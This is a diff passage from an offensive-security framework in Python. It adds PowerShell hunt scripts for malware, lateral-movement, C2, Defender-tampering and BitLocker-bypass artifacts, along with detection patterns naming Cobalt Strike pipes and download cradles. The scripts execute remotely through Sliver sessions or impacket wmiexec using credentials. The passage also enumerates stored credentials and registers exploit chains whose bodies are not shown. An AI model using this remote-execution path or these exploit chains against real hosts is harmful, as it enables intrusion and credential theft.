+        '^\\\\\.\\pipe\\[a-z0-9]{8}$'                         = 'Random 8-char pipe (CS default beacon)'
+        'REDSUN'                                                = 'RedSun LPE named pipe — exploit in progress'
+        'MSSE-[0-9]+-server'                                   = 'Metasploit meterpreter named pipe'
+        'postex_ssh_[0-9a-f]'                                  = 'Cobalt Strike post-exploitation pipe'
+        'Beacon|beacon_[0-9a-f]'                               = 'Cobalt Strike beacon pipe'
+    }
+    foreach ($pipe in $pipes) {
+        foreach ($pat in $mal_pipe_patterns.Keys) {
+            if ($pipe -match $pat) {
+                $findings.Add(@{category='named_pipe'; severity='CRITICAL'
+                    artifact=$pipe; detail=$mal_pipe_patterns[$pat]})
+                break
+            }
+        }
+    }
+} catch {}
+
+# ── File system artifacts — drop locations ────────────────────────────────────
+$mal_files = @{
+    "$env:SystemRoot\tasksche.exe"              = 'WannaCry ransom binary (CVE-2017-0144)'
+    "$env:SystemRoot\mssecsvc.exe"              = 'WannaCry propagation binary'
+    "$env:TEMP\EternalBlue.exe"                 = 'EternalBlue staging artifact'
+    "$env:TEMP\DoublePulsar.exe"                = 'DoublePulsar staging artifact'
+    "$env:SystemRoot\System32\tasks\Microsoft\Windows\Maintenance\WinSAT" = 'Emotet scheduled task path'
+    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.exe"    = 'Startup folder persistence (Emotet/TrickBot)'
+}
+foreach ($path in $mal_files.Keys) {
+    if (Test-Path $path -ErrorAction SilentlyContinue) {
+        $findings.Add(@{category='file_artifact'; severity='CRITICAL'
+            artifact=$path; detail=$mal_files[$path]})
+    }
+}
+
+# ── Ryuk ransomware artifacts ─────────────────────────────────────────────────
+# Ryuk drops HERMES mutex, kills backup services, deletes shadow copies
+$ryuk_svcs = @('vss','sql','svc$','memtas','mepocs','sophos','veeam','backup','GxVss','GxBlr','GxFWD','GxCVD','GxCIMgr')
+foreach ($svc in $ryuk_svcs) {
+    $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
+    if ($s -and $s.Status -eq 'Stopped') {
+        $findings.Add(@{category='ryuk_indicator'; severity='HIGH'
+            artifact="Service stopped: $svc"
+            detail='Backup/AV service stopped — Ryuk ransomware pre-encryption phase indicator'
+            status='Stopped'})
+    }
+}
+
+# ── SMBv1 (EternalBlue/WannaCry/EternalRocks prerequisite) ────────────────────
+$smb1 = (Get-SmbServerConfiguration -ErrorAction SilentlyContinue).EnableSMB1Protocol
+if ($smb1) {
+    $findings.Add(@{category='config'; severity='CRITICAL'
+        artifact='SMBv1'; detail='SMBv1 enabled — EternalBlue/WannaCry/EternalRocks exploitable (CVE-2017-0144)'
+        value='EnableSMB1Protocol=True'})
+}
+
+# ── Credential Guard disabled (enables Mimikatz LSASS dump) ──────────────────
+try {
+    $cg = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard' -ErrorAction Stop).EnableVirtualizationBasedSecurity
+    if ($cg -eq 0 -or $null -eq $cg) {
+        $findings.Add(@{category='config'; severity='MEDIUM'
+            artifact='Credential Guard'
+            detail='Credential Guard disabled — LSASS memory dump possible (Mimikatz/NotPetya/Dianxun attack vector)'})
+    }
+} catch {}
+
+$findings | ConvertTo-Json -Depth 4
+"""
+        b64 = __import__('base64').b64encode(
+            ps_script.encode('utf-16-le')).decode()
+        result = _exec_ps(b64, data_key='detect_malware')
+        if not result:
+            data['detect_malware'] = {'note': 'exec required — use sliver session or exec op first'}
+
+    def do_hunt_lateral():
+        """
+        Hunt for lateral movement indicators via Windows Event Log (Security + System).
+        Looks for: logon type 3 bursts, PsExec artifacts, WMI remote exec, token impersonation.
+        Requires: Get-WinEvent access (domain user or local admin).
+        """
+        log("→ hunt_lateral")
+        ps_script = r"""
+$hours = 24
+$since = (Get-Date).AddHours(-$hours)
+$hits  = @()
+
+# Logon type 3 (network) — lateral movement via pass-the-hash / PsExec
+try {
+    $logons = Get-WinEvent -FilterHashtable @{
+        LogName='Security'; Id=4624; StartTime=$since
+    } -MaxEvents 200 -ErrorAction SilentlyContinue
+    $net_logons = $logons | Where-Object {
+        $_.Properties[8].Value -eq 3 -and
+        $_.Properties[5].Value -notmatch 'SYSTEM|NETWORK SERVICE|LOCAL SERVICE|-'
+    }
+    foreach ($e in $net_logons | Select-Object -First 20) {
+        $hits += [PSCustomObject]@{
+            category  = 'logon_type3'; severity = 'MEDIUM'
+            timestamp = $e.TimeCreated.ToString('s')
+            detail    = "Net logon: $($e.Properties[5].Value)@$($e.Properties[6].Value) from $($e.Properties[18].Value)"
+            technique = 'T1021 - Remote Services / Pass-the-Hash'
+        }
+    }
+} catch {}
+
+# 4648 — explicit credential logon (RunAs / PsExec indicator)
+try {
+    $explicit = Get-WinEvent -FilterHashtable @{
+        LogName='Security'; Id=4648; StartTime=$since
+    } -MaxEvents 100 -ErrorAction SilentlyContinue |
+        Where-Object { $_.Properties[5].Value -notmatch 'SYSTEM|-' }
+    foreach ($e in $explicit | Select-Object -First 10) {
+        $hits += [PSCustomObject]@{
+            category  = 'explicit_cred'; severity = 'HIGH'
+            timestamp = $e.TimeCreated.ToString('s')
+            detail    = "Explicit cred logon: $($e.Properties[5].Value) targeting $($e.Properties[8].Value)"
+            technique = 'T1078 - Valid Accounts with Explicit Credentials'
+        }
+    }
+} catch {}
+
+# 7045 — new service installed (PsExec/EternalRocks drops PSEXESVC)
+try {
+    $new_svcs = Get-WinEvent -FilterHashtable @{
+        LogName='System'; Id=7045; StartTime=$since
+    } -MaxEvents 50 -ErrorAction SilentlyContinue
+    foreach ($e in $new_svcs) {
+        $hits += [PSCustomObject]@{
+            category  = 'new_service'; severity = 'HIGH'
+            timestamp = $e.TimeCreated.ToString('s')
+            detail    = "New service: $($e.Properties[0].Value) ($($e.Properties[2].Value))"
+            technique = 'T1543.003 - Create or Modify System Process: Windows Service'
+        }
+    }
+} catch {}
+
+# 4688 — suspicious process creation (wmiexec, mshta, regsvr32, certutil)
+try {
+    $procs = Get-WinEvent -FilterHashtable @{
+        LogName='Security'; Id=4688; StartTime=$since
+    } -MaxEvents 500 -ErrorAction SilentlyContinue |
+        Where-Object {
+            $_.Properties[5].Value -match 'wmic|wmiexec|mshta|regsvr32|certutil|bitsadmin|cmstp' -or
+            ($_.Properties[5].Value -match 'powershell' -and $_.Properties[8].Value -match 'encoded|enc |iex|downloadstring')
+        }
+    foreach ($e in $procs | Select-Object -First 15) {
+        $hits += [PSCustomObject]@{
+            category  = 'sus_process'; severity = 'CRITICAL'
+            timestamp = $e.TimeCreated.ToString('s')
+            detail    = "Suspicious proc: $($e.Properties[5].Value) args=$($e.Properties[8].Value.Substring(0,[Math]::Min(150,$e.Properties[8].Value.Length)))"
+            technique = 'T1059 - Command and Scripting Interpreter'
+        }
+    }
+} catch {}
+
+# Named pipe connections (Cobalt Strike / Turla / EternalRocks)
+try {
+    $pipes = Get-WinEvent -FilterHashtable @{
+        LogName='Security'; Id=5145; StartTime=$since
+    } -MaxEvents 200 -ErrorAction SilentlyContinue |
+        Where-Object { $_.Properties[6].Value -match 'pipe' }
+    foreach ($e in $pipes | Select-Object -First 10) {
+        $hits += [PSCustomObject]@{
+            category  = 'named_pipe_access'; severity = 'HIGH'
+            timestamp = $e.TimeCreated.ToString('s')
+            detail    = "Pipe access: $($e.Properties[6].Value) from $($e.Properties[8].Value)"
+            technique = 'T1021.005 - Named Pipe (Cobalt Strike/Turla/EternalRocks)'
+        }
+    }
+} catch {}
+
+$hits | Sort-Object timestamp -Descending | ConvertTo-Json -Depth 3
+"""
+        b64 = __import__('base64').b64encode(
+            ps_script.encode('utf-16-le')).decode()
+        _exec_ps(b64, data_key='hunt_lateral')
+
+    def do_hunt_c2():
+        """
+        Hunt for C2 beaconing indicators: unusual outbound connections, proxy cred
+        extraction artifacts, beacon-interval scheduled tasks, DNS TXT queries.
+        Derived from: OperationDianxun C2 pattern, EternalRocks downloader, Turla DNS C2.
+        """
+        log("→ hunt_c2")
+        ps_script = r"""
+$hits = @()
+
+# Active network connections to unusual ports (not 80/443/53/135/139/445)
+$known_ports = @(80,443,53,135,139,445,137,138,3389,5985,5986,22,25,110,143,993,995)
+$conns = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue |
+    Where-Object {
+        $_.RemoteAddress -notmatch '^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|127\.|::1|0\.0\.0\.0)' -and
+        $_.RemotePort -notin $known_ports -and
+        $_.RemoteAddress -ne '0.0.0.0'
+    }
+foreach ($c in $conns | Select-Object -First 20) {
+    $proc = Get-Process -Id $c.OwningProcess -ErrorAction SilentlyContinue
+    $hits += [PSCustomObject]@{
+        category  = 'unusual_outbound'; severity = 'HIGH'
+        detail    = "PID=$($c.OwningProcess) ($($proc.Name)) → $($c.RemoteAddress):$($c.RemotePort)"
+        technique = 'T1071 - Application Layer Protocol C2'
+    }
+}
+
+# Scheduled tasks with HTTP/HTTPS actions (beaconing pattern)
+$beacon_tasks = Get-ScheduledTask -ErrorAction SilentlyContinue |
+    Where-Object {
+        ($_.Actions | Where-Object {
+            $_.Execute -match 'powershell|cmd|wscript' -and
+            $_.Arguments -match 'http|DownloadString|WebClient|curl|wget|certutil'
+        })
+    } | Select-Object -First 10
+foreach ($t in $beacon_tasks) {
+    $hits += [PSCustomObject]@{
+        category  = 'beacon_task'; severity = 'CRITICAL'
+        detail    = "Beacon-like task: $($t.TaskName) → $($t.Actions[0].Arguments.Substring(0,[Math]::Min(200,$t.Actions[0].Arguments.Length)))"
+        technique = 'T1053.005 - Scheduled Task Beacon (EternalRocks/APT34 pattern)'
+    }
+}
+
+# Windows Credential Manager — proxy/web creds (EternalRocks ProxyPassword extraction)
+try {
+    $creds = cmdkey /list 2>&1 | Select-String '(Target|User)' | Select-Object -First 20
+    if ($creds) {
+        $hits += [PSCustomObject]@{
+            category  = 'stored_creds'; severity = 'HIGH'
+            detail    = "Stored credentials in Credential Manager: $($creds -join ' | ')"
+            technique = 'T1555.004 - Windows Credential Manager (EternalRocks ProxyPass target)'
+        }
+    }
+} catch {}
+
+# DNS cache — look for Turla-style DNS C2 (TXT record queries)
+try {
+    $dns_cache = Get-DnsClientCache -ErrorAction SilentlyContinue |
+        Where-Object { $_.Type -in @(16,28) -and  # TXT or AAAA
+                       $_.Name -notmatch 'microsoft|windows|apple|google|cloudflare' } |
+        Select-Object -First 20
+    foreach ($d in $dns_cache) {
+        $hits += [PSCustomObject]@{
+            category  = 'dns_c2'; severity = 'MEDIUM'
+            detail    = "Unusual DNS: $($d.Name) ($($d.Type))"
+            technique = 'T1071.004 - DNS C2 (Turla/OilRig pattern)'
+        }
+    }
+} catch {}
+
+# WDigest enabled check (OperationDianxun/NotPetya enable this to harvest plaintext creds)
+$wdigest = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -ErrorAction SilentlyContinue).UseLogonCredential
+if ($wdigest -eq 1) {
+    $hits += [PSCustomObject]@{
+        category  = 'wdigest'; severity = 'CRITICAL'
+        detail    = 'WDigest enabled (UseLogonCredential=1) — attacker harvesting plaintext creds from LSASS'
+        technique = 'T1003.001 - LSASS Memory via WDigest (OperationDianxun/NotPetya technique)'
+    }
+}
+
+$hits | ConvertTo-Json -Depth 3
+"""
+        b64 = __import__('base64').b64encode(
+            ps_script.encode('utf-16-le')).decode()
+        _exec_ps(b64, data_key='hunt_c2')
+
+    # ── BlueHammer + UnDefend + RedSun — Defender evasion artifacts ─────────────
+    def do_hunt_defender_evade():
+        """
+        Detect Windows Defender tampering: BlueHammer RPC hollowing, UnDefend signature
+        file locking, RedSun cloud-tag TOCTOU artifacts, and WD engine state manipulation.
+        """
+        ps_script = r"""
+$hits = [System.Collections.Generic.List[hashtable]]::new()
+
+# 1. WinDefend service state + signature age (BlueHammer/UnDefend)
+try {
+    $svc = Get-Service -Name WinDefend -ErrorAction Stop
+    $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
+    if ($mpStatus) {
+        $sigAge = ((Get-Date) - $mpStatus.AntivirusSignatureLastUpdated).TotalDays
+        if ($sigAge -gt 7) {
+            $hits.Add(@{type='DEFENDER-SIG-STALE'; severity='HIGH';
+                detail="WD signature not updated in $([math]::Round($sigAge,1)) days — possible BlueHammer hollow or UnDefend lock"})
+        }
+        if (-not $mpStatus.RealTimeProtectionEnabled) {
+            $hits.Add(@{type='DEFENDER-RTP-DISABLED'; severity='CRITICAL';
+                detail="Real-time protection disabled — WD engine tampered or service killed"})
+        }
+        if (-not $mpStatus.AntivirusEnabled) {
+            $hits.Add(@{type='DEFENDER-AV-DISABLED'; severity='CRITICAL';
+                detail="Antivirus engine disabled — UnDefend aggressive mode or BlueHammer RPC hollowing"})
+        }
+    }
+} catch { $hits.Add(@{type='DEFENDER-SERVICE-ERROR'; severity='HIGH'; detail=$_.Exception.Message}) }
+
+# 2. mpavbase.vdm file accessibility + size (UnDefend lock / BlueHammer hollow)
+try {
+    $sigPath = (Get-ItemPropertyValue 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Signature Updates' 'SignatureLocation' -ErrorAction Stop)
+    $vdm = Join-Path $sigPath 'mpavbase.vdm'
+    if (Test-Path $vdm) {
+        $fi = Get-Item $vdm
+        # Hollowed vdm is typically <1MB; real signatures are 100MB+
+        if ($fi.Length -lt 1048576) {
+            $hits.Add(@{type='DEFENDER-VDM-HOLLOW'; severity='CRITICAL';
+                detail="mpavbase.vdm is $([math]::Round($fi.Length/1KB,1))KB — suspiciously small, possible BlueHammer hollow signature install"})
+        }
+        # Try to open exclusively — if locked, UnDefend is active
+        try {
+            $fs = [System.IO.File]::Open($vdm, 'Open', 'Read', 'None')
+            $fs.Close()
+        } catch {
+            $hits.Add(@{type='DEFENDER-VDM-LOCKED'; severity='CRITICAL';
+                detail="mpavbase.vdm is exclusively locked — UnDefend passive mode active, signature updates blocked"})
+        }
+    }
+} catch {}
+
+# 3. RedSun artifact — TieringEngineService.exe in System32
+$ties = "$env:SystemRoot\System32\TieringEngineService.exe"
+if (Test-Path $ties) {
+    $fi = Get-Item $ties
+    # Legitimate TieringEngineService.exe is signed by Microsoft
+    try {
+        $sig = Get-AuthenticodeSignature $ties
+        if ($sig.Status -ne 'Valid' -or $sig.SignerCertificate.Subject -notlike '*Microsoft*') {
+            $hits.Add(@{type='REDSUN-TIERING-HIJACK'; severity='CRITICAL';
+                detail="TieringEngineService.exe in System32 has invalid or non-Microsoft signature ($($sig.Status)) — RedSun cloud-tag TOCTOU LPE artifact"})
+        }
+    } catch {
+        $hits.Add(@{type='REDSUN-TIERING-UNSIGNED'; severity='CRITICAL';
+                detail="TieringEngineService.exe present in System32 but signature check failed — possible RedSun LPE"})
+    }
+}
+
+# 4. RedSun named pipe artifact
+$pipes = [System.IO.Directory]::GetFiles('\\.\pipe\') 2>$null
+if ($pipes -contains '\\.\pipe\REDSUN') {
+    $hits.Add(@{type='REDSUN-NAMED-PIPE'; severity='CRITICAL';
+        detail="Named pipe \\.\pipe\REDSUN detected — RedSun LPE tool active in memory"})
+}
+
+# 5. BlueHammer WD RPC hollow — check if WD RPC endpoint registers fake update path
+# UUID c503f532-443a-4c69-8300-ccd1fbdb3839 / IMpService77BDAF73-B396-481F-9042-AD358843EC24
+try {
+    $rpcport = [System.IO.File]::ReadAllText("$env:TEMP\BlueHammerProbe.tmp") 2>$null
+} catch {}
+# Indirect: check WD scheduled tasks for unusual update paths
+Get-ScheduledTask -TaskPath '\Microsoft\Windows\Windows Defender\*' -ErrorAction SilentlyContinue | ForEach-Object {
+    $actions = $_.Actions | Where-Object { $_.Execute -and $_.Execute -notlike '*MpCmdRun*' -and $_.Execute -notlike '*MsMpEng*' -and $_.Execute -notlike '*ConfigSecurityPolicy*' }
+    if ($actions) {
+        $hits.Add(@{type='DEFENDER-TASK-HIJACK'; severity='HIGH';
+            detail="WD scheduled task '$($_.TaskName)' has unusual action: $($actions[0].Execute)"})
+    }
+}
+
+# 6. WD backup signature files accessible (baseline — should exist post-update)
+try {
+    $bkPath = Join-Path $sigPath 'Backup\mpavbase.lkg'
+    if (-not (Test-Path $bkPath)) {
+        $hits.Add(@{type='DEFENDER-BACKUP-MISSING'; severity='MEDIUM';
+            detail="mpavbase.lkg backup missing — UnDefend may have interfered with signature backup"})
+    }
+} catch {}
+
+$hits | ConvertTo-Json -Depth 3
+"""
+        b64 = __import__('base64').b64encode(
+            ps_script.encode('utf-16-le')).decode()
+        _exec_ps(b64, data_key='hunt_defender_evade')
+
+    # ── GreenPlasma + MiniPlasma — Cloud Files EoP artifacts ─────────────────────
+    def do_hunt_cloud_files_eop():
+        """
+        Detect GreenPlasma (CTFMON arbitrary section EoP) and MiniPlasma
+        (CVE-2020-17103 unpatched cldflt race condition) artifacts. Checks for
+        registry symlink abuse in CloudFiles policy key and DisableLockWorkstation.
+        """
+        ps_script = r"""
+$hits = [System.Collections.Generic.List[hashtable]]::new()
+
+# 1. Registry symlink abuse — GreenPlasma/MiniPlasma leaves BlockedApps as REG_LINK
+# Check HKCU\Software\Policies\Microsoft\CloudFiles\BlockedApps type
+try {
+    $regPath = 'HKCU:\Software\Policies\Microsoft\CloudFiles'
+    if (Test-Path $regPath) {
+        $key = Get-Item $regPath -ErrorAction Stop
+        $subkeys = $key.GetSubKeyNames()
+        if ($subkeys -contains 'BlockedApps') {
+            # Open with OpenLink to detect symlink
+            $fullPath = "HKCU\Software\Policies\Microsoft\CloudFiles\BlockedApps"
+            $nativeKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(
+                "Software\Policies\Microsoft\CloudFiles\BlockedApps", $false)
+            if ($nativeKey) {
+                # If it has a SymbolicLinkValue value, it's a registry symlink attack
+                $vals = $nativeKey.GetValueNames()
+                if ($vals -contains 'SymbolicLinkValue') {
+                    $target = $nativeKey.GetValue('SymbolicLinkValue')
+                    $hits.Add(@{type='CLOUDFILES-REGISTRY-SYMLINK'; severity='CRITICAL';
+                        detail="HKCU\...\CloudFiles\BlockedApps has SymbolicLinkValue → '$target' — GreenPlasma/MiniPlasma EoP (CVE-2020-17103) active"})
+                }
+                $nativeKey.Close()
+            }
+        }
+    }
+} catch {}
+
+# 2. DisableLockWorkstation policy set via GreenPlasma abuse
+try {
+    $lockPol = Get-ItemPropertyValue 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System' 'DisableLockWorkstation' -ErrorAction Stop
+    if ($lockPol -eq 1) {
+        $hits.Add(@{type='POLICY-LOCK-DISABLED'; severity='HIGH';
+            detail="DisableLockWorkstation=1 in user policy — GreenPlasma SetPolicyVal technique used to disable workstation lock screen"})
+    }
+} catch {}
+
+# 3. CTFMON section hijack residue — check for CTFMON_DEAD object name
+# We can't query object manager from PS without a driver, but we check ctfmon state
+$ctfmon = Get-Process ctfmon -ErrorAction SilentlyContinue
+if (-not $ctfmon) {
+    # CTFMON not running could indicate GreenPlasma section hijack killed it
+    $hits.Add(@{type='CTFMON-NOT-RUNNING'; severity='MEDIUM';
+        detail="ctfmon.exe not running — GreenPlasma CTFMON section hijack may have disrupted the process (normal on some minimal installs)"})
+}
+
+# 4. CfAbortOperation abuse — cldapi.dll unusual consumers
+# Check processes that loaded cldapi.dll that are not cloud sync providers
+Get-Process | ForEach-Object {
+    try {
+        $mods = $_.Modules | Where-Object { $_.ModuleName -eq 'cldapi.dll' }
+        if ($mods) {
+            $knownCloudProcs = @('OneDrive','FileSyncConfig','iCloudDrive','Dropbox','Box','GoogleDriveFS','OneDriveStandaloneUpdater')
+            if ($knownCloudProcs -notcontains $_.Name) {
+                $hits.Add(@{type='CLDAPI-UNUSUAL-CONSUMER'; severity='HIGH';
+                    detail="Process '$($_.Name)' (PID $($_.Id)) loaded cldapi.dll — unusual for non-cloud-sync process; possible GreenPlasma/MiniPlasma/BlueHammer exploitation"})
+            }
+        }
+    } catch {}
+}
+
+# 5. Cloud files volatile registry key (MiniPlasma TARGET_KEY: .DEFAULT\Volatile Environment)
+try {
+    $volEnv = Get-Item 'HKCU:\Volatile Environment' -ErrorAction Stop
+    $hits.Add(@{type='VOLATILE-ENV-EXISTS'; severity='LOW';
+        detail="HKCU\Volatile Environment key present — MiniPlasma targets this as the redirect destination for CloudFiles symlink attack"})
+} catch {}
+
+$hits | ConvertTo-Json -Depth 3
+"""
+        b64 = __import__('base64').b64encode(
+            ps_script.encode('utf-16-le')).decode()
+        _exec_ps(b64, data_key='hunt_cloud_files_eop')
+
+    # ── YellowKey — BitLocker bypass artifact detection ───────────────────────────
+    def do_hunt_bitlocker_bypass():
+        """
+        Detect YellowKey BitLocker bypass via FsTx in System Volume Information.
+        Enumerates connected drives (USB/external) and checks EFI/WinRE partition
+        for the FsTx trigger directory structure. Windows 11 / Server 2022+ only.
+        """
+        ps_script = r"""
+$hits = [System.Collections.Generic.List[hashtable]]::new()
+
+# 1. BitLocker status on all volumes
+try {
+    $blVolumes = Get-BitLockerVolume -ErrorAction Stop
+    foreach ($vol in $blVolumes) {
+        if ($vol.VolumeStatus -eq 'FullyDecrypted' -and $vol.VolumeType -eq 'OperatingSystem') {
+            $hits.Add(@{type='BITLOCKER-OS-UNPROTECTED'; severity='HIGH';
+                detail="OS volume $($vol.MountPoint) is not BitLocker protected — YellowKey not applicable but OS data at risk"})
+        }
+        if ($vol.ProtectionStatus -eq 'Off' -and $vol.VolumeStatus -eq 'FullyEncrypted') {
+            $hits.Add(@{type='BITLOCKER-PROTECTION-SUSPENDED'; severity='CRITICAL';
+                detail="BitLocker protection SUSPENDED on $($vol.MountPoint) — encryption present but TPM unlocking disabled, volume accessible"})
+        }
+    }
+} catch {}
+
+# 2. Enumerate removable/external drives and check for YellowKey FsTx structure
+$drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -ne $null }
+foreach ($drv in $drives) {
+    $fstxPath = Join-Path $drv.Root "System Volume Information\FsTx"
+    if (Test-Path $fstxPath) {
+        $fstxFiles = Get-ChildItem $fstxPath -Recurse -ErrorAction SilentlyContinue
+        # YellowKey signature: FsTxKtmLog.blf + FsTxKtmLogContainer* files
+        $hasKtm = $fstxFiles | Where-Object { $_.Name -like 'FsTxKtmLog*' }
+        $hasLog  = $fstxFiles | Where-Object { $_.Name -like 'FsTxLog*' }
+        if ($hasKtm -and $hasLog) {
+            $hits.Add(@{type='YELLOWKEY-FSTX-TRIGGER'; severity='CRITICAL';
+                detail="YellowKey BitLocker bypass FsTx structure found on $($drv.Root) — FsTxKtmLog.blf + FsTxLogContainer present. Attacker can reboot to WinRE (SHIFT+Restart+hold CTRL) to get SYSTEM shell bypassing BitLocker"})
+        } elseif ($fstxFiles) {
+            $hits.Add(@{type='YELLOWKEY-FSTX-PARTIAL'; severity='HIGH';
+                detail="Partial FsTx structure on $($drv.Root) — may be incomplete YellowKey setup or leftover transaction logs"})
+        }
+    }
+}
+
+# 3. Check WinRE partition for FsTx (YellowKey works via EFI partition too)
+try {
+    $winrePart = Get-Partition | Where-Object { $_.GptType -eq '{de94bba4-06d1-4d40-a16a-bfd50179d6ac}' }
+    foreach ($part in $winrePart) {
+        $letter = $part.DriveLetter
+        if ($letter) {
+            $fstxWinRE = "${letter}:\System Volume Information\FsTx"
+            if (Test-Path $fstxWinRE) {
+                $hits.Add(@{type='YELLOWKEY-WINRE-PARTITION-FSTX'; severity='CRITICAL';
+                    detail="FsTx found in WinRE partition ($letter) — YellowKey can bypass BitLocker without external USB, attacker only needs to pull disk and copy files to EFI partition"})
+            }
+        }
+    }
+} catch {}
+
+# 4. WinRE status — disabled WinRE limits YellowKey but also the OS
+try {
+    $reagent = reagentc.exe /info 2>&1
+    if ($reagent -match 'Enabled') {
+        $hits.Add(@{type='WINRE-ENABLED'; severity='INFO';
+            detail="WinRE is enabled — YellowKey BitLocker bypass is possible if FsTx trigger files are present on any accessible drive or EFI partition"})
+    } else {
+        $hits.Add(@{type='WINRE-DISABLED'; severity='LOW';
+            detail="WinRE is disabled — YellowKey BitLocker bypass requires WinRE; disabling WinRE is a partial mitigation"})
+    }
+} catch {}
+
+# 5. Secure Boot status — YellowKey survives Secure Boot
+try {
+    $sb = Confirm-SecureBootUEFI -ErrorAction Stop
+    if (-not $sb) {
+        $hits.Add(@{type='SECURE-BOOT-OFF'; severity='HIGH';
+            detail="Secure Boot disabled — YellowKey BitLocker bypass and other boot-level attacks possible"})
+    }
+} catch {}
+
+$hits | ConvertTo-Json -Depth 3
+"""
+        b64 = __import__('base64').b64encode(
+            ps_script.encode('utf-16-le')).decode()
+        _exec_ps(b64, data_key='hunt_bitlocker_bypass')
+
+    def _exec_ps(b64_cmd: str, data_key: str) -> bool:
+        """Execute a base64-encoded PowerShell command via Sliver session or impacket exec."""
+        sid = params.get('session_id', '')
+        if sid:
+            # Sliver path
+            cmd = f'powershell.exe -NonInteractive -NoProfile -EncodedCommand {b64_cmd}'
+            result = _sliver().exec(sid, cmd, timeout=60)
+            raw = (result.get('output') or '').strip()
+        elif auth.has_creds:
+            # impacket wmiexec fallback
+            import subprocess as _sp, shutil as _sh
+            wmi_bin = _sh.which('wmiexec.py') or _sh.which('impacket-wmiexec')
+            if not wmi_bin:
+                data[data_key] = {'error': 'no sliver session and impacket-wmiexec not found'}
+                return False
+            cred_str = f'{auth.domain}/{auth.username}:{auth.password}' if auth.password else \
+                       f'{auth.domain}/{auth.username}'
+            r = _sp.run([wmi_bin, cred_str, f'//{target}',
+                         f'powershell.exe -EncodedCommand {b64_cmd}'],
+                        capture_output=True, text=True, timeout=90)
+            raw = r.stdout.strip()
+        else:
+            data[data_key] = {'error': 'session_id or credentials required for PowerShell exec'}
+            return False
+
+        try:
+            import json as _json
+            parsed = _json.loads(raw)
+            data[data_key] = {'findings': parsed if isinstance(parsed, list) else [parsed],
+                              'count': len(parsed) if isinstance(parsed, list) else 1}
+            log(f"→ {data_key}: {len(data[data_key]['findings'])} finding(s)")
+            return True
+        except Exception:
+            # Raw output fallback
+            data[data_key] = {'raw': raw[:2000]}
+            return bool(raw)
+
     # ── handler dispatch ──────────────────────────────────────────────
     handlers = {
         # assessment
@@ -2727,6 +3919,21 @@ End Sub""",
         'fileless_pe':      do_fileless_pe,
         'inject_exe':       do_inject_exe,
         'office_macros':    do_office_macros,
+        # malware intelligence hunting (theZoo-derived)
+        'detect_malware':          do_detect_malware,
+        'hunt_lateral':            do_hunt_lateral,
+        'hunt_c2':                 do_hunt_c2,
+        # Hunt operations
+        'hunt_defender_evade':     do_hunt_defender_evade,
+        'hunt_cloud_files_eop':    do_hunt_cloud_files_eop,
+        'hunt_bitlocker_bypass':   do_hunt_bitlocker_bypass,
+        # Offensive exploit chains
+        'undefend':                do_undefend,
+        'yellowkey_deploy':        do_yellowkey_deploy,
+        'bluehammer_exec':         do_bluehammer_exec,
+        'redsun_exec':             do_redsun_exec,
+        'greenplasma_exec':        do_greenplasma_exec,
+        'offense_chain':           do_offense_chain,
     }
 
     if operation == 'auto':
@@ -2734,7 +3941,9 @@ End Sub""",
             try: handlers[op]()
             except Exception as e: errors.append(f"{op}: {e}")
         if auth.has_creds:
-            for op in ['kerberoast', 'asreproast', 'bloodhound', 'loot', 'privesc_check']:
+            for op in ['kerberoast', 'asreproast', 'bloodhound', 'loot',
+                       'privesc_check', 'detect_malware', 'hunt_lateral', 'hunt_c2',
+                       'hunt_defender_evade', 'hunt_cloud_files_eop', 'hunt_bitlocker_bypass']:
                 try: handlers[op]()
                 except Exception as e: errors.append(f"{op}: {e}")
             # attempt lsa_fix if LimitBlankPasswordUse flagged
